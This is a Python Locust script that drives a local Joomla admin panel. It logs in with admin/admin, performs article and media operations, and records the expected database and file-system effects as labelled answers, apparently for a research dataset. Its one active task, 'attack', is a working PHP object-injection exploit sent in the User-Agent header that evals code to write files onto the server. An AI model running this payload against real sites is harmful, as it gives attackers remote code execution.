from locust import HttpUser, task, between, events
from locust.clients import ResponseContextManager
import random
import string  
from loguru import logger  
import os
from itertools import count
import json
import gevent
import io
import re
import time
from playwright.sync_api import sync_playwright
import bs4
from urllib.parse import unquote
from gevent.lock import Semaphore
import requests


data_dir = "/var/www/html/images/data/"

counter = count(0)  # 计数器，用于生成唯一的消息 ID
answer_file = os.path.join(os.path.dirname(__file__), "answers.json")  # 日志文件路径
answers = {}
db_lock = Semaphore()

# CRSF_TOKEN = None
# COOKIES = None
# USER_AGENT = None
users = [
    {
        "username": "admin",
        "password": "admin",
        "id": 1
    },
]
users_crt = []

@events.test_start.add_listener
def on_test_start(environment, **_kwargs):
    def get_headers(url, username, password):  
        with sync_playwright() as p:  
            browser = p.chromium.launch()
            logger.info("Browser launched")
            page = browser.new_page()  
            
            try:  
                # 访问登录页  
                page.goto(f"{url}")  
                
                # 填写并提交登录表单  
                page.fill('input[name="username"]', username)  
                page.fill('input[name="passwd"]', password)  
                page.click('button[tabindex="3"]')  
                
                logger.info("Login form submitted")
                # 等待页面加载完成  
                page.wait_for_load_state('networkidle')  
                logger.info("Page loaded")
                
                cookies = page.context.cookies()
                useragent = page.evaluate("navigator.userAgent")
                
                # 等待子项加载  
                time.sleep(1)
                page.goto(f"{url}?option=com_content")
                # 等待页面加载完成
                page.wait_for_load_state('networkidle')
                # 在页面中用正则表达式寻找 TRANSACTION_ID，形如 <input type="hidden" name="TRANSACTION_ID" value="1">
                html = page.content()
                matchres = re.search(r'<input type="hidden" name="(.*?)" value="1">', html)
                if matchres:
                    crt_id = matchres.group(1)
                else:
                    logger.error("TRANSACTION_ID not found in page")
                    crt_id = None

                return cookies, useragent, crt_id
            finally:  
                browser.close()
    
    # CRSF_TOKEN, COOKIES, USER_AGENT = get_pgadmin_headers("http://localhost:5050", "vulhub@example.com", "vulhub")
    for user in users:
        crt = {}
        crt["COOKIES"], crt["USER_AGENT"], crt["TRANS_ID"] = get_headers("http://localhost:8080/administrator/index.php", user["username"], user["password"])
        users_crt.append(crt)
    input("Press Enter to Start the test...")  # 等待用户按下回车键


def calculate_bytes_sent(method: str, uri: str, request_headers: dict, body: str) -> int:
    """计算请求的字节数"""
    request_line = f"{method} {uri} HTTP/1.1\r\n"
    headers = "".join([f"{key}: {value}\r\n" for key, value in request_headers.items()])
    request = f"{request_line}{headers}\r\n{body}"
    return len(request)


def random_string(length: int = 15):  
    """生成随机字符串"""  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  


def new_log_entry(response: ResponseContextManager, extra: dict | None = None) -> dict:
    """创建新的日志条目"""
    # print(response.request.body.decode("utf-8") if response.request.body else "")
    # print(response.request.headers)
    try:
        body = json.loads(str(response.request.body)) if response.request.body else {} 
        body = {k: str(v) for k, v in body.items()}  # 将所有值转换为字符串
    except json.JSONDecodeError:
        boundary_match = re.search(r'boundary=(.+?)', response.request.headers.get('Content-Type', ''))
        body = {}
        if boundary_match:
            boundary = boundary_match.group(1)
            # print("boundary:", boundary)
            parts = response.request.body.decode("utf-8").split('--' + boundary)
            for part in parts:
                if 'Content-Disposition' in part:
                    # 提取 name
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        print("name:", name)
                        if name == 'Filedata[]':
                            # 提取 filename
                            filename_match = re.search(r'filename="([^"]+)"', part)
                            if filename_match:
                                body['filename'] = filename_match.group(1)
                        else:
                            # 提取对应的值
                            # print(repr(part.split(name)[1]))
                            value_match = re.search(r'\r\n\r\n(.*?)\r\n', part.split(name)[1], re.DOTALL)
                            if value_match:
                                value = value_match.group(1).strip()
                                body[name] = value

    if response.request.headers.get("Content-Type") == "application/x-www-form-urlencoded":
        # 如果是表单提交，解析表单数据
        body = {unquote(k): unquote(v) for k, v in (item.split('=') for item in str(response.request.body).split('&'))}

    if extra:
        for key, value in extra.items():
            body[key] = str(value)  # 将所有值转换为字符串
    if '?' in response.request.path_url:
        query_string = response.request.path_url.split('?')[1]
        query_params = query_string.split('&')
        for param in query_params:
            key, value = param.split('=')
            # 对key和value进行URL解码
            key = unquote(key)
            value = unquote(value)
            body[key] = value
    return {
        "verb": response.request.method,
        "uri": response.request.path_url,
        "bytes_sent": calculate_bytes_sent(
            response.request.method,
            response.request.path_url,
            response.request.headers,
            str(response.request.body) if response.request.body else "",
        ),
        "num_params": len(body),
        "params": body,
    }


class APIUser(HttpUser):  
    """定义用户行为"""  
    wait_time = between(2, 4)  # 每次请求之间的等待时间（1到3秒之间随机）
    trans_id = None  # 初始化事务 ID
    user_index = 0  # 用户索引
        
    def on_start(self):
        try:
            # 登陆获取Session
            self.user_index = random.randint(0, len(users_crt) - 1)
            COOKIES = users_crt[self.user_index]["COOKIES"]
            USER_AGENT = users_crt[self.user_index]["USER_AGENT"]
            TRANS_ID = users_crt[self.user_index]["TRANS_ID"]

            if all([COOKIES, USER_AGENT, TRANS_ID]):
                self.client.headers["Cookie"] = "; ".join([f"{cookie['name']}={cookie['value']}" for cookie in COOKIES])
                self.client.headers["User-Agent"] = USER_AGENT
                self.trans_id = TRANS_ID
            else:
                logger.error("Failed to obtain cookies, or user agent.")
                raise Exception("Failed to obtain cookies, or user agent.")
            self.client.headers["Host"] = "localhost:8080"
            self.client.headers["Origin"] = "http://localhost:8080"

        except KeyboardInterrupt:
            logger.info("Test interrupted by user")
            raise
        except gevent.Timeout:
            logger.error("Timeout occurred")
            raise
        except Exception as e:
            gevent.sleep(1)
            self.on_start()
    
    # @task
    def new_article(self, article_id=0):
        """创建新文章"""
        # 生成随机数据
        title = random_string(10)
        content = random_string(100)
        alias = random_string(5)

        x_request_id = str(next(counter))
        with self.client.post(
            f"/administrator/index.php",
            params={
                "option": "com_content",
                "layout": "edit",
                "id": article_id,
            },
            headers={
                "x_request_id": x_request_id,
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "http://localhost:8080/administrator/index.php?option=com_content&view=article&layout=edit",
            },
            data={
                "task": "article.save",
                "jform[title]": title,
                "jform[alias]": alias,
                "jform[catid]": "2",
                "jform[articletext]": f"<p>{content}</p>",
                self.trans_id: "1",
            },
            catch_response=True,
            allow_redirects=False,
        ) as response:
            # 处理响应
            if response.status_code == 303:
                # 解析响应
                response.success()
                entry = new_log_entry(response)
                db_statements = []
                if article_id == 0:
                    db_statements = [
                        {
                            "type": "INSERT",
                            "table": "j_content",
                            "columns": {
                                "id": "0",
                                "title": title,
                                "alias": alias.lower(),
                                "introtext": f"<p>{content}</p>",
                                "fulltext": "",
                                "catid": "2",
                                "images": "{}",
                                "urls": "{}",
                                "attribs": "{}",
                                "version": "1",
                                "access": "1",
                                "metadata": "{}"
                            },
                            "is_match": True
                        },
                        # {
                        #     "type": "INSERT",
                        #     "table": "j_ucm_history",
                        #     "columns": {
                        #         "ucm_item_id": "*",
                        #         "ucm_type_id": "1",
                        #         "editor_user_id": "951",
                        #     },
                        #     "is_match": True
                        # },                        
                    ]
                else:
                    db_statements = [
                        {
                            "type": "UPDATE",
                            "table": "j_content",
                            "columns": {
                                "title": title,
                                "alias": alias.lower(),
                                "introtext": f"<p>{content}</p>",
                                "state": "0",
                                "catid": "2",
                                "access": "1",
                                "language": "*",
                                "id": str(article_id)
                            },
                            "is_match": True
                        },
                        # {
                        #     "type": "INSERT",
                        #     "table": "j_ucm_history",
                        #     "columns": {
                        #         "ucm_item_id": str(article_id),
                        #         "ucm_type_id": "1",
                        #         "editor_user_id": "951"
                        #     },
                        #     "is_match": True
                        # },
                    ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": time.time(),
                }
            else:
                logger.error(f"{'new' if article_id == 0 else 'update'} article failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")

    def get_all_articles(self):
        """获取所有文章"""
        # x_request_id = str(next(counter))
        with self.client.post(
            "/administrator/index.php",
            params={
                "option": "com_content",
                "view": "articles",
            },
            headers={
                # "x_request_id": x_request_id,
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "http://localhost:8080/administrator/index.php?option=com_content&view=articles",
            },
            data={
                "list[limit]": "10000",
                "limitstart": "0",
                self.trans_id: "1",
            },
            catch_response=True,
            allow_redirects=True,
        ) as response:
            # 处理响应
            article_ids = []
            if response.status_code == 200:
                id_matches = re.findall(r'href="/administrator/index.php\?option=com_content&amp;task=article.edit&amp;id=(\d+)"', response.text)
                if id_matches:
                    for id_match in id_matches:
                        article_ids.append(id_match)
            else:
                logger.error(f"Request failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")
            # 返回所有文章的 ID
            return article_ids

    # @task
    def delete_article(self):
        """删除文章"""
        # 获取所有文章的 ID
        with db_lock:
            article_ids = self.get_all_articles()
            if article_ids:
                # 随机选择一个 ID
                article_id = random.choice(article_ids)
                def post(tp="trash"):
                    x_request_id = str(next(counter))
                    with self.client.post(
                        "/administrator/index.php",
                        params={
                            "option": "com_content",
                            "view": "articles",
                        },
                        headers={
                            "x_request_id": x_request_id,
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Referer": f"http://localhost:8080/administrator/index.php?option=com_content",
                        },
                        data={
                            "task": f"articles.{tp}",
                            "cid[]": article_id,
                            self.trans_id: "1",
                        },
                        catch_response=True,
                        allow_redirects=False,
                    ) as response:
                        # 处理响应
                        if response.status_code == 303:
                            logger.info(f"Article {article_id} {tp} successfully")
                            response.success()
                            entry = new_log_entry(response)
                            db_statements = []
                            if tp == "delete":
                                db_statements=[
                                    {
                                        "type": "DELETE",
                                        "table": "j_contentitem_tag_map",
                                        "columns": {
                                            "type_alias": "com_content",
                                            "content_item_id": str(article_id)
                                        },
                                        "is_match": True
                                    },
                                    {
                                        "type": "DELETE",
                                        "table": "j_ucm_history",
                                        "columns": {
                                            "ucm_item_id": str(article_id),
                                            "ucm_type_id": "1"
                                        },
                                        "is_match": True
                                    },
                                    {
                                        "type": "DELETE",
                                        "table": "j_content",
                                        "columns": {
                                            "id": str(article_id)
                                        },
                                        "is_match": True
                                    },
                                ]
                            else:
                                db_statements = [
                                    {
                                        "type": "UPDATE",
                                        "table": "j_content",
                                        "columns": {
                                            "state": "-2",
                                            "id": str(article_id)
                                        },
                                        "is_match": True
                                    },
                                    {
                                        "type": "UPDATE",
                                        "table": "j_content",
                                        "columns": {
                                            "checked_out": "0",
                                            "checked_out_time": "0000-00-00 00:00:00",
                                            "id": str(article_id)
                                        },
                                        "is_match": True
                                    },
                                ]
                            answers[str(x_request_id)] = {
                                "http_request": entry,
                                "db_statements": db_statements,
                                "request_time": time.time(),
                            }
                        else:
                            logger.error(f"{tp} article {article_id} failed with status code: {response.status_code}")
                            response.failure(f"Request failed with status code: {response.status_code}")
                
                post("trash")
                gevent.sleep(1.5)
                post("delete")

    # @task
    def update_article(self):
        """更新文章"""
        # 获取所有文章的 ID
        with db_lock:
            article_ids = self.get_all_articles()
            if article_ids:
                # 随机选择一个 ID
                article_id = random.choice(article_ids)
                self.new_article(article_id)
                logger.info(f"Article {article_id} updated successfully")
        
    # @task
    def get_all_files(self):
        """获取所有文件"""
        x_request_id = str(next(counter))
        with self.client.get(
            "/administrator/index.php",
            params={
                "option": "com_media",
                "view": "mediaList",
                "tmpl": "component",
                "folder": "data",
            },
            headers={
                "x_request_id": x_request_id,
                "Referer": f"http://localhost:8080/administrator/index.php?option=com_media&view=files&folder={data_dir}",
            },
            catch_response=True,
            allow_redirects=True,
        ) as response:
            # 处理响应
            files = []
            if response.status_code == 200:
                id_matches = re.findall(r'type="checkbox" name="rm\[\]" value="(.+)"', response.text)
                if id_matches:
                    for id_match in id_matches:
                        files.append(id_match)
            else:
                logger.error(f"Request failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")
            # 返回所有文件的 ID
            return files
    
    # @task
    def upload_file(self):
        """上传文件"""
        # 获取所有文件的 ID
        response = self.client.get(
            "/administrator/index.php?option=com_media&folder=data"
        )
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        form = soup.find("form", id="uploadForm")
        upload_url = ""
        if form:
            upload_url = form.get("action")
        else:
            logger.error("Upload form not found in page")
            return
        upload_path = upload_url.split("8080")[1] + "&folder=data"
        file_content = random_string(100)
        file_name = random_string(10) + ".txt"
        file_content = io.StringIO(file_content)
        x_request_id = str(next(counter))
        with self.client.post(
            upload_path,
            headers={
                "x_request_id": x_request_id,
                "Referer": f"http://localhost:8080/administrator/index.php?option=com_media&folder=data",
            },
            files={
                "Filedata[]": (file_name, file_content, "text/plain"),
                "folder": "data",
            },
            catch_response=True,
            allow_redirects=False,
        ) as response:
            # 处理响应
            if response.status_code == 303:
                # 解析响应
                entry = new_log_entry(response)
                fs_operations = [
                    {
                        "operation": "create",
                        "source_path": f"{data_dir}{file_name}",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"{data_dir}{file_name}",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"{data_dir}{file_name}",
                        "destination_path": None,
                        "is_directory": False
                    }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
                response.success()
            else:
                logger.error(f"Upload file failed with status code: {response.status_code}")
                response.failure(f"Request failed with status code: {response.status_code}")

    # @task
    def delete_file(self):
        """删除文件"""
        # 获取所有文件的 ID
        file_ids = self.get_all_files()
        gevent.sleep(2)
        if file_ids:
            # 随机选择一个 ID
            file_id = random.choice(file_ids)
            x_request_id = str(next(counter))
            with self.client.get(
                "/administrator/index.php",
                params={
                    "option": "com_media",
                    "task": "file.delete",
                    "tmpl": "index",
                    "folder": "data",
                    self.trans_id: "1",
                    "rm[]": file_id,
                },
                headers={
                    "x_request_id": x_request_id,
                    "Referer": f"http://localhost:8080/administrator/index.php?option=com_media&view=files&folder=data",
                },
                catch_response=True,
                allow_redirects=False,
            ) as response:
                # 处理响应
                if response.status_code == 303:
                    # 解析响应
                    entry = new_log_entry(response)
                    fs_operations = [
                        {
                            "operation": "update",
                            "source_path": f"{data_dir}{file_id}",
                            "destination_path": None,
                            "is_directory": False
                        },
                        {
                            "operation": "delete",
                            "source_path": f"{data_dir}{file_id}",
                            "destination_path": None,
                            "is_directory": False
                        }
                    ]
                    answers[str(x_request_id)] = {
                        "http_request": entry,
                        "fs_operations": fs_operations,
                        "request_time": time.time(),
                    }
                    logger.info(f"File {file_id} deleted successfully")
                    response.success()
                else:
                    logger.error(f"Delete file {file_id} failed with status code: {response.status_code}")
                    response.failure(f"Request failed with status code: {response.status_code}")

    @task
    def attack(self):
        # 正确的序列化payload模板

        def attack_url(url, user_agent, file_name):
            headers = {
                'User-Agent': user_agent
            }
            cookies = requests.get(url, headers=headers).cookies
            x_request_id = str(next(counter))
            headers["x_request_id"] = x_request_id
            response =  requests.get(url, headers=headers, cookies=cookies)
            if response.status_code == 200:
                entry = new_log_entry(response)
                fs_operations = [
                    {
                        "operation": "create",
                        "source_path": f"{data_dir}{file_name}",
                        "destination_path": None,
                        "is_directory": False
                    },
                    {
                        "operation": "update",
                        "source_path": f"{data_dir}{file_name}",
                        "destination_path": None,
                        "is_directory": False
                    }
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            return response.content.decode('utf-8', errors='ignore')

        def php_str_noquotes(data):
            """Convert string to chr(xx).chr(xx) for use in PHP"""
            encoded = ""
            for char in data:
                encoded += "chr({0}).".format(ord(char))
            return encoded[:-1]

        def generate_payload(php_payload):
            php_payload = "eval({0})".format(php_str_noquotes(php_payload))
            terminate = '\xf0\xfd\xfd\xfd'
            exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
            
            injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
            exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
            exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

            print(exploit_template)
            return exploit_template

        def exploit(host):
            turl = host
            file_name = random_string(10) + ".txt"
            # 写入 shell
            code = f"file_put_contents('/var/www/html/images/data/{file_name}', {random_string(50)});"
            payload = generate_payload(code)
            try:
                attack_url(turl, payload, file_name)
                print("攻击成功！")
            except Exception as e:
                print("{} 失败！漏洞已修补或请求错误！".format(turl))
                print(str(e))  # 可开启调试
        exploit("http://localhost:8080")


@events.test_stop.add_listener
def on_test_stop(environment, **_kwargs):
    # 将答案写入文件
    with open(answer_file, "w") as f:
        json.dump(answers, f, indent=4)
    logger.info(f"Answers written to {answer_file}")
